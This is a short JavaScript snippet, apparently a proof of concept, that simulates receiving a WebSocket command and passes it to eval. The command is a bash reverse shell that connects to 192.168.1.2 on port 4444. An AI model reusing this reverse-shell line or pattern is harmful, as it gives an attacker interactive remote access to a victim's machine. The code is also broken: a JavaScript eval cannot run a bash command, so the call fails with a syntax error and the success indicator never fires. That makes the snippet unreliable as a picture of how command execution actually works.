(function () {
    // Simulate a WebSocket message containing the command to execute the reverse shell
    const simulatedWebSocketCommand = `
        bash -c 'bash -i >& /dev/tcp/192.168.1.2/4444 0>&1'
    `;

    // Function to simulate receiving a WebSocket message
    function executeSimulatedCommand(command) {
        try {
            // Construct a function to execute the reverse shell command
            const exec = new Function(`return function() { return eval(\`${command}\`); }`)();
            exec(); // Execute the command
            document.body.style.backgroundColor = "green"; // Indicate success
        } catch (error) {
            console.error("Command execution failed:", error);
            document.body.style.backgroundColor = "red"; // Indicate failure
        }
    }

    // Simulate receiving a message from the WebSocket and executing it
    executeSimulatedCommand(simulatedWebSocketCommand);
})();
